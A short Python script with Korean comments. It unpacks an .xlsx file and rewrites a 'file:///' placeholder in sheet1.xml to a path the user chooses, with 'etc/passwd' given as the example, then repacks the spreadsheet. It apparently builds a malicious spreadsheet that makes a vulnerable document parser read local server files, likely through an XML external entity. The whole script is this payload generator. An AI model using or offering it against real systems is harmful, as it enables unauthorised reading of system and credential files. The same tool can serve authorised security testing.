import os
import zipfile
import shutil
import time

# 파일 확장자 변경
def rename_file_to_zip(original_file, zip_file):
    os.rename(original_file, zip_file)
    print(f"{original_file}을 {zip_file}로 확장자 변경")
    time.sleep(5)

# zip파일 압축 해제
def extract_zip_file(zip_file, extract_to):
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        zip_ref.extractall(extract_to)
    print(f"{zip_file}을 {extract_to}로 압축 해제")
    time.sleep(5)

# sheet1.xml 파일 데이터 수정
def modify_xml_file(xml_file_path, old_value, new_value):
    print(f".xml 파일 경로: {xml_file_path}")

    if not os.access(xml_file_path, os.W_OK):
        print("파일 쓰기 권한 없음")
        return
        
    with open(xml_file_path, 'r', encoding='utf-8') as file:
        data = file.read()
    print(".xml 파일 내용 \n")
    print("\n", data[:1000])

    new_full_value = f"file:///{new_value}"

    # {new_value} 파싱 성공 여부
    if old_value in data:
        print(f"\n '{old_value}' 문자 발견")
        data = data.replace(old_value, new_full_value)
    else:
        print(f"\n'{old_value}' 미발견")
        
    with open(xml_file_path, 'w', encoding='utf-8') as file:
        file.write(data)
    print(f"\n{xml_file_path} 파일 수정 완료")
    time.sleep(5)

# 수정 파일 재 압축
def create_zip_from_folder(folder_path, zip_file):
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)
    print(f"{folder_path} 디렉터리를 {zip_file}로 압축")
    time.sleep(5)

# xlsx파일 빼고 전부 삭제
def clean_up(temp_files):
    for item in temp_files:
        if os.path.isdir(item):
            shutil.rmtree(item)
            print(f"{item} 관련 파일 및 디렉터리 삭제 완료")
        elif os.path.exists(item):
            os.remove(item)
            print(f"{item} 파일 삭제 완료")
    time.sleep(5)

# 작업 흐름
def process_file(original_file, zip_file, final_file, xml_file_path, old_value, new_value):
    # 확장자 변경
    rename_file_to_zip(original_file, zip_file)
    
    # zip 확장자 변경
    extract_zip_file(zip_file, 'sample')
    
    # xml 파일 수정
    modify_xml_file(xml_file_path, old_value, new_value)
    
    # sample 디렉터리 zip으로 재 압축
    create_zip_from_folder('sample', 'sample.zip')
    os.rename('sample.zip', final_file)
    print(f"sample.zip 파일 {final_file}로 이름 변경")
    
    clean_up([zip_file, 'sample'])
    
    print(f"파일이 성공적으로 {final_file}로 생성되었습니다.")

def main():
    original_file = 'sample.xlsx'
    zip_file = 'sample.zip'
    final_file = 'sample.xlsx'
    xml_file_path = 'sample/xl/worksheets/sheet1.xml'
    old_value = "file:///!!!!!!!!"
    
    new_value = input("\n새로운 값을 입력하세요 (예: etc/passwd): ")
    
    # 파일 처리
    process_file(original_file, zip_file, final_file, xml_file_path, old_value, new_value)

if __name__ == "__main__":
    main()
